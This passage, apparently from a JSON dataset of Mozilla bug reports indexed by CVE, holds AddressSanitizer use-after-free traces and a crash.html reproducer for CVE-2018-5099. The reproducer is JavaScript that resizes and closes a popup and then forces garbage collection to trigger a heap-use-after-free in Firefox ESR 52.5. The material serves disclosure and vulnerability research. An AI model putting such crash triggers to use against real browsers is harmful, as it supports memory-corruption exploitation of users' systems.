/home/worker/workspace/build/src/layout/forms/nsNumberControlFrame.cpp:392:8 #9 0x7f51f1197197 in nsCSSFrameConstructor::GetAnonymousContent(nsIContent*, nsIFrame*, nsTArray<nsIAnonymousContentCreator::ContentInfo>&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4228:17 #10 0x7f51f1189b72 in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10775:3 #11 0x7f51f11a30a1 in nsCSSFrameConstructor::ConstructFrameFromItemInternal(nsCSSFrameConstructor::FrameConstructionItem&, nsFrameConstructorState&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:4026:9 #12 0x7f51f11ae196 in nsCSSFrameConstructor::ConstructFramesFromItem(nsFrameConstructorState&, nsCSSFrameConstructor::FrameConstructionItemList::Iterator&, nsContainerFrame*, nsFrameItems&) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:6196:3 #13 0x7f51f118a8c4 in ConstructFramesFromItemList /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10640:5 #14 0x7f51f118a8c4 in nsCSSFrameConstructor::ProcessChildren(nsFrameConstructorState&, nsIContent*, nsStyleContext*, nsContainerFrame*, bool, nsFrameItems&, bool, PendingBinding*, nsIFrame*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:10852 #15 0x7f51f11951ad in nsCSSFrameConstructor::ConstructBlock(nsFrameConstructorState&, nsIContent*, nsContainerFrame*, nsContainerFrame*, nsStyleContext*, nsContainerFrame**, nsFrameItems&, nsIFrame*, PendingBinding*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:11862:3 #16 0x7f51f1191608 in nsCSSFrameConstructor::ConstructDocElementFrame(mozilla::dom::Element*, nsILayoutHistoryState*) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:2625:5 #17 0x7f51f11b4876 in nsCSSFrameConstructor::ContentRangeInserted(nsIContent*, nsIContent*, nsIContent*, nsILayoutHistoryState*, bool) /home/worker/workspace/build/src/layout/base/nsCSSFrameConstructor.cpp:7753:7 #18 0x7f51f137f815 in PresShell::ContentInserted(nsIDocument*, nsIContent*, nsIContent*, int) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4427:3 #19 0x7f51ed32d6de in nsNodeUtils::ContentInserted(nsINode*, nsIContent*, int) /home/worker/workspace/build/src/dom/base/nsNodeUtils.cpp:201:3 #20 0x7f51ed2d277e in nsINode::doInsertChildAt(nsIContent*, unsigned int, bool, nsAttrAndChildArray&) /home/worker/workspace/build/src/dom/base/nsINode.cpp:1630:7 #21 0x7f51ed2d8ec6 in nsINode::ReplaceOrInsertBefore(bool, nsINode*, nsINode*, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/nsINode.cpp:2514:14 #22 0x7f51ed9ab98b in InsertBefore /home/worker/workspace/build/src/dom/base/nsINode.h:1850:12 #23 0x7f51ed9ab98b in AppendChild /home/worker/workspace/build/src/dom/base/nsINode.h:1854 #24 0x7f51ed9ab98b in mozilla::dom::NodeBinding::appendChild(JSContext*, JS::Handle<JSObject*>, nsINode*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/NodeBinding.cpp:696 #25 0x7f51eed10399 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2904:13 #26 0x7f51f5095085 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #27 0x7f51f5095085 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #28 0x7f51f5095d32 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #29 0x7f51f4e043ac in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #30 0x7f51f4dd39df in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:333:14 #31 0x7f51f4de14cf in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:400:12 #32 0x7f51f4de3c7e in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:689:12 #33 0x7f51f5095085 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #34 0x7f51f5095085 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #35 0x7f51f507548f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #36 0x7f51f507548f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #37 0x7f51f505a64d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/dom/base/nsINode.h:1630:12 in GetBoolFlag Shadow bytes around the buggy address: 0x0c2a8009e6e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2a8009e6f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2a8009e700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2a8009e710: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c2a8009e720: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c2a8009e730: fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd 0x0c2a8009e740: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2a8009e750: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2a8009e760: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa 0x0c2a8009e770: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c2a8009e780: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==29513==ABORTING"
      }
    ],
    "CVE-2018-5099": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1416878",
        "title": "heap-use-after-free in nsWebShellWindow::WindowResized",
        "description": "The following testcase crashes the latest ASAN build of Firefox ESR 52.5.0 (SourceStamp=f9df5238dca13e40b8128faba317df25e2f69249). It requires the fuzzPriv extension and might need a few attempts to reproduce. Loading the testcase in multiple tabs at the same time helps with reproducibility. crash.html: <script> function spin () { var x=new XMLHttpRequest(); x.open(\"POST\",\"https://mozilla.org\",false); try{x.send(\"X\");}catch(e){} } function start () { o1=window.open('data:text/html,<div>','popup54','height=1'); window.top.setTimeout(fun0, 400); } function fun0() { o1.onresize=fun1; o1.resizeTo(10,-40961); o1.resizeBy(1,-16); } var x=0; function fun1() { if(x++) return; o1.close(); for(var x=0; x<10; x++) spin(); fuzzPriv.GC();fuzzPriv.CC();fuzzPriv.GC();fuzzPriv.CC(); window.setTimeout(\"location.reload()\",100); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==5553==ERROR: AddressSanitizer: heap-use-after-free on address 0x61200022e6db at pc 0x7fce4a05c116 bp 0x7ffcb1e3c310 sp 0x7ffcb1e3c308 READ of size 1 at 0x61200022e6db thread T0 #0 0x7fce4a05c115 in IsLocked /home/worker/workspace/build/src/xpfe/appshell/nsXULWindow.h:74:35 #1 0x7fce4a05c115 in WindowResized /home/worker/workspace/build/src/xpfe/appshell/nsWebShellWindow.cpp:302 #2 0x7fce4a05c115 in non-virtual thunk to nsWebShellWindow::WindowResized(nsIWidget*, int, int) /home/worker/workspace/build/src/xpfe/appshell/nsWebShellWindow.cpp:294 #3 0x7fce488a5d62 in DispatchResized /home/worker/workspace/build/src/widget/gtk/nsWindow.cpp:550:9 #4 0x7fce488a5d62 in nsWindow::Resize(double, double, bool) /home/worker/workspace/build/src/widget/gtk/nsWindow.cpp:1140 #5 0x7fce4a071c2c in nsXULWindow::SetSize(int, int, bool) /home/worker/workspace/build/src/xpfe/appshell/nsXULWindow.cpp:624:17 #6 0x7fce44d51f3e in nsGlobalWindow::ResizeByOuter(int, int, mozilla::ErrorResult&, bool) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:7965:12 #7 0x7fce4633899d in mozilla::dom::WindowBinding::resizeBy(JSContext*, JS::Handle<JSObject*>, nsGlobalWindow*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:3467:3 #8 0x7fce4632ff69 in mozilla::dom::WindowBinding::genericMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:15158:13 #9 0x7fce4cf39375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #10 0x7fce4cf39375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #11 0x7fce4cf3a022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #12 0x7fce4cca869c in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #13 0x7fce4cc77ccf in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:333:14 #14 0x7fce4cc857bf in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:400:12 #15 0x7fce4cc87f6e in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:689:12 #16 0x7fce4cf39375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #17 0x7fce4cf39375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #18 0x7fce4cf1977f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #19 0x7fce4cf1977f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #20 0x7fce4cefe93d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #21 0x7fce4cf399df in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #22 0x7fce4cf3a022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #23 0x7fce4ca0ac7d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #24 0x7fce466d7769 in mozilla::dom::Function::Call(JSContext*, JS::Handle<JS::Value>, nsTArray<JS::Value> const&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/FunctionBinding.cpp:36:8 #25 0x7fce44d87167 in Call<nsCOMPtr<nsISupports> > /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/FunctionBinding.h:70:12 #26 0x7fce44d87167 in nsGlobalWindow::RunTimeoutHandler(mozilla::dom::Timeout*, nsIScriptContext*) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:13029 #27 0x7fce44d88f00 in nsGlobalWindow::RunTimeout(mozilla::dom::Timeout*) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:13308:32 #28 0x7fce44f68972 in mozilla::dom::(anonymous namespace)::TimerCallback(nsITimer*, void*) /home/worker/workspace/build/src/dom/base/Timeout.cpp:63:3 #29 0x7fce42435039 in nsTimerImpl::Fire(int) /home/worker/workspace/build/src/xpcom/threads/nsTimerImpl.cpp:479:7 #30 0x7fce4240948c in nsTimerEvent::Run() /home/worker/workspace/build/src/xpcom/threads/TimerThread.cpp:285:3 #31 0x7fce424254c2 in mozilla::ThrottledEventQueue::Inner::ExecuteRunnable() /home/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:161:15 #32 0x7fce42424e8f in mozilla::ThrottledEventQueue::Inner::Executor::Run() /home/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:74:7 #33 0x7fce42417cab in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1216:7 #34 0x7fce42499dec in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:361:10 #35 0x7fce4872fa74 in mozilla::dom::XMLHttpRequestMainThread::SendInternal(mozilla::dom::XMLHttpRequestMainThread::RequestBodyBase const*) /home/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp:2956:14 #36 0x7fce4874bfb3 in mozilla::dom::XMLHttpRequestMainThread::Send(JSContext*, nsAString_internal const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.h:380:13 #37 0x7fce463eb4bb in mozilla::dom::XMLHttpRequestBinding::send(JSContext*, JS::Handle<JSObject*>, mozilla::dom::XMLHttpRequest*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/XMLHttpRequestBinding.cpp:781:7 #38 0x7fce46baa5f9 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2904:13 #39 0x7fce4cf39375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #40 0x7fce4cf39375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #41 0x7fce4cf1977f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #42 0x7fce4cf1977f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #43 0x7fce4cefe93d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #44 0x7fce4cf399df in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #45 0x7fce4cf3a022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #46 0x7fce4cca869c in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #47 0x7fce4cc77ccf in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:333:14 #48 0x7fce4cc857bf in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:400:12 #49 0x7fce4cc87f6e in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:689:12 #50 0x7fce4cf39375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #51 0x7fce4cf39375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #52 0x7fce4cf3a022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #53 0x7fce4ca0ac7d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #54 0x7fce46593bcf in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:259:37 #55 0x7fce46fc430a in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:361:12 #56 0x7fce46fc430a in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214 #57 0x7fce46f8e6ad in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1134:16 #58 0x7fce46f900d7 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1287:17 #59 0x7fce46f7ae36 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:380:5 #60 0x7fce46f7e4c8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:711:9 #61 0x7fce4920a5f3 in PresShell::FireResizeEvent() /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:2038:5 #62 0x7fce492201a8 in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4122:7 #63 0x7fce4920e7e6 in FlushPendingNotifications /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4054:3 #64 0x7fce4920e7e6 in HandlePostedReflowCallbacks /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4022 #65 0x7fce4920e7e6 in PresShell::DidDoReflow(bool) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:9217 #66 0x7fce4920b1ad in PresShell::ResizeReflowIgnoreOverride(int, int, int, int) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:1974:7 #67 0x7fce487e5bb0 in DoSetWindowDimensions /home/worker/workspace/build/src/view/nsViewManager.cpp:192:7 #68 0x7fce487e5bb0 in nsViewManager::SetWindowDimensions(int, int, bool) /home/worker/workspace/build/src/view/nsViewManager.cpp:228 #69 0x7fce4917ffbf in nsDocumentViewer::SetBoundsWithFlags(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, unsigned int) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:2005:5 #70 0x7fce4918012b in nsDocumentViewer::SetBoundsWithFlags(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, unsigned int) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:2019:5 #71 0x7fce49f0812c in SetPositionAndSize /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5999:19 #72 0x7fce49f0812c in non-virtual thunk to nsDocShell::SetPositionAndSize(int, int, int, int, unsigned int) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5985 #73 0x7fce4511d224 in nsFrameLoader::UpdateBaseWindowPositionAndSize(nsSubDocumentFrame*) /home/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:2500:5 #74 0x7fce4511cc7e in nsFrameLoader::UpdatePositionAndSize(nsSubDocumentFrame*) /home/worker/workspace/build/src/dom/base/nsFrameLoader.cpp:2472:3 #75 0x7fce4951fc6d in ReflowFinished /home/worker/workspace/build/src/layout/generic/nsSubDocumentFrame.cpp:817:5 #76 0x7fce4951fc6d in non-virtual thunk to nsSubDocumentFrame::ReflowFinished() /home/worker/workspace/build/src/layout/generic/nsSubDocumentFrame.cpp:812 #77 0x7fce4920e753 in HandlePostedReflowCallbacks /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4013:12 #78 0x7fce4920e753 in PresShell::DidDoReflow(bool) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:9217 #79 0x7fce4920b1ad in PresShell::ResizeReflowIgnoreOverride(int, int, int, int) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:1974:7 #80 0x7fce487e5bb0 in DoSetWindowDimensions /home/worker/workspace/build/src/view/nsViewManager.cpp:192:7 #81 0x7fce487e5bb0 in nsViewManager::SetWindowDimensions(int, int, bool) /home/worker/workspace/build/src/view/nsViewManager.cpp:228 #82 0x7fce4917ffbf in nsDocumentViewer::SetBoundsWithFlags(mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, unsigned int) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:2005:5 #83 0x7fce49f0812c in SetPositionAndSize /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5999:19 #84 0x7fce49f0812c in non-virtual thunk to nsDocShell::SetPositionAndSize(int, int, int, int, unsigned int) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:5985 #85 0x7fce4a05c034 in WindowResized /home/worker/workspace/build/src/xpfe/appshell/nsWebShellWindow.cpp:298:5 #86 0x7fce4a05c034 in non-virtual thunk to nsWebShellWindow::WindowResized(nsIWidget*, int, int) /home/worker/workspace/build/src/xpfe/appshell/nsWebShellWindow.cpp:294 #87 0x7fce488a5d62 in DispatchResized /home/worker/workspace/build/src/widget/gtk/nsWindow.cpp:550:9 #88 0x7fce488a5d62 in nsWindow::Resize(double, double, bool) /home/worker/workspace/build/src/widget/gtk/nsWindow.cpp:1140 #89 0x7fce4a071c2c in nsXULWindow::SetSize(int, int, bool) /home/worker/workspace/build/src/xpfe/appshell/nsXULWindow.cpp:624:17 #90 0x7fce44d51f3e in nsGlobalWindow::ResizeByOuter(int, int, mozilla::ErrorResult&, bool) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:7965:12 #91 0x7fce4633899d in mozilla::dom::WindowBinding::resizeBy(JSContext*, JS::Handle<JSObject*>, nsGlobalWindow*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:3467:3 #92 0x7fce4632ff69 in mozilla::dom::WindowBinding::genericMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:15158:13 #93 0x7fce4cf39375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #94 0x7fce4cf39375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #95 0x7fce4cf3a022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #96 0x7fce4cca869c in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #97 0x7fce4cc77ccf in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:333:14 #98 0x7fce4cc857bf in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:400:12 #99 0x7fce4cc87f6e in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:689:12 #100 0x7fce4cf39375 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #101 0x7fce4cf39375 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #102 0x7fce4cf1977f in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #103 0x7fce4cf1977f in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #104 0x7fce4cefe93d in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #105 0x7fce4cf399df in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #106 0x7fce4cf3a022 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #107 0x7fce4ca0ac7d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #108 0x7fce466d7769 in mozilla::dom::Function::Call(JSContext*, JS::Handle<JS::Value>, nsTArray<JS::Value> const&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/FunctionBinding.cpp:36:8 #109 0x7fce44d87167 in Call<nsCOMPtr<nsISupports> > /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/FunctionBinding.h:70:12 #110 0x7fce44d87167 in nsGlobalWindow::RunTimeoutHandler(mozilla::dom::Timeout*, nsIScriptContext*) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:13029 #111 0x7fce44d88f00 in nsGlobalWindow::RunTimeout(mozilla::dom::Timeout*) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:13308:32 #112 0x7fce44f68972 in mozilla::dom::(anonymous namespace)::TimerCallback(nsITimer*, void*) /home/worker/workspace/build/src/dom/base/Timeout.cpp:63:3 #113 0x7fce42435039 in nsTimerImpl::Fire(int) /home/worker/workspace/build/src/xpcom/threads/nsTimerImpl.cpp:479:7 #114 0x7fce4240948c in nsTimerEvent::Run() /home/worker/workspace/build/src/xpcom/threads/TimerThread.cpp:285:3 #115 0x7fce424254c2 in mozilla::ThrottledEventQueue::Inner::ExecuteRunnable() /home/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:161:15 #116 0x7fce42424e8f in mozilla::ThrottledEventQueue::Inner::Executor::Run() /home/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:74:7 #117 0x7fce42417cab in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1216:7 #118 0x7fce42499dec in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:361:10 #119 0x7fce4872fa74 in mozilla::dom::XMLHttpRequestMainThread::SendInternal(mozilla::dom::XMLHttpRequestMainThread::RequestBodyBase const*) /home/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp:2956:14 #120 0x7fce4874bfb3 in mozilla::dom::XMLHttpRequestMainThread::Send(JSContext*, nsAString_internal const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.h:380:13 #121 0x7fce463eb4bb in mozilla::dom::XMLHttpRequestBinding::send(JSContext*, JS::Handle<JSObject*>, mozilla::dom::XMLHttpRequest*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/XMLHttpRequestBinding.cpp:781:7 #122 0x7fce46baa5f9 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2904:13 #123 